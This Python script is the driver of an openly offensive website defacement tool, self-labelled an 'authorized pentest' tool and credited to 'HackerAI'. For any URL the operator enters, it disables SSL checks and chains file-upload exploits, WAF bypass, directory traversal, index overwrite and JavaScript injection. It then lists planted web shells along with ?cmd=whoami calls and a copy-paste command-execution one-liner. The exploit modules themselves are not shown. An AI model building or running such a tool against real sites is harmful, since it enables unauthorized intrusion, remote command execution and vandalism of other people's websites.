#!/usr/bin/env python3
import sys
import os
import shutil
import urllib3
import requests
from colorama import Fore, init
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Disable SSL warnings globally
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Fix import path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import Config
from modules.recon import Recon
from modules.exploit import Exploit
from modules.defacer import Defacer

init(autoreset=True)

def create_hardened_session():
    """SSL-proof session"""
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'close',
        'Cache-Control': 'no-cache'
    })
    
    # Retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def banner():
    print(f"""
{Fore.RED}
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █ DEFACE TOOL v3.1 - SSL-PROOF - FULL CHAIN - AUTHORIZED PENTEST        █
    █ Author: HackerAI                                                          █
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    """)

def copy_custom_image(image_path):
    if not image_path or image_path.lower() == '':
        print(f"{Fore.YELLOW}[INFO] Using default banner")
        return True
    
    image_path = image_path.strip().strip('"').strip("'")
    if not os.path.exists(image_path):
        print(f"{Fore.RED}[!] Image not found: {image_path}")
        return False
    
    try:
        os.makedirs('assets', exist_ok=True)
        shutil.copy2(image_path, 'assets/banner.jpg')
        print(f"{Fore.GREEN}[+] Custom image: {os.path.basename(image_path)}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Copy failed: {e}")
        return False

def print_success_report(exploit, vuln_url):
    print(f"""
{Fore.GREEN+'='*70}
🎯 MISSION COMPLETE - ACCESS GRANTED!
{'='*70}
TARGET: {vuln_url}
SHELLS DEPLOYED: {len(exploit.success_paths)}

🔗 LIVE SHELLS (OPEN IN BROWSER):
""")
    
    for i, path in enumerate(exploit.success_paths[-5:], 1):
        print(f"  {i}. {Fore.CYAN}{path}")
        print(f"     → ?cmd=whoami")
        print(f"     → ?cmd=id")
    
    print(f"""
💻 QUICK TEST (Copy-paste):
python -c \"import requests; print(requests.get('{exploit.success_paths[-1] if exploit.success_paths else vuln_url}?cmd=whoami', verify=False).text)\" 

{'='*70}
    """)

def main():
    banner()
    
    target = input(f"{Fore.YELLOW}[?] Target URL: ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target.lstrip('http://https://')
    
    image_path = input(f"{Fore.YELLOW}[?] Image path (ENTER=default): ").strip()
    copy_custom_image(image_path)
    
    print(f"{Fore.CYAN}[*] {target} - SSL-PROOF ATTACK INITIATED")
    print(f"{Fore.CYAN+'='*60}")
    
    try:
        # Step 1: RECON
        print(f"{Fore.BLUE}[1/4] 🔍 RECON...")
        recon = Recon()
        vuln_url = recon.check_vulnerable(target)
        
        # Step 2: FULL EXPLOIT CHAIN
        print(f"{Fore.BLUE}[2/4] 💣 EXPLOIT CHAIN...")
        exploit = Exploit(vuln_url)
        exploit.session = create_hardened_session()  # SSL FIX!
        
        print(f"   {Fore.MAGENTA}[2.1] File uploads...")
        exploit.file_upload_exploit()
        
        print(f"   {Fore.MAGENTA}[2.2] WAF bypass...")
        exploit.waf_bypass_exploit()
        
        print(f"   {Fore.MAGENTA}[2.3] Directory traversal...")
        exploit.dir_trav_exploit()
        
        print(f"   {Fore.MAGENTA}[2.4] Index overwrite...")
        exploit.index_deface()
        
        # Step 3: DEFACE
        print(f"{Fore.BLUE}[3/4] 🎨 DEFACE...")
        defacer = Defacer(vuln_url)
        defacer.replace_index(vuln_url)
        defacer.inject_js(vuln_url)
        
        # Step 4: FINAL REPORT
        print(f"{Fore.BLUE}[4/4] 📊 REPORT...")
        print_success_report(exploit, vuln_url)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Cancelled")
    except Exception as e:
        print(f"{Fore.RED}[!] {e}")
        print(f"{Fore.YELLOW}[+] SSL bypassed - check manual paths")

if __name__ == "__main__":
    main()
    input(f"\n{Fore.YELLOW}Press ENTER to exit...")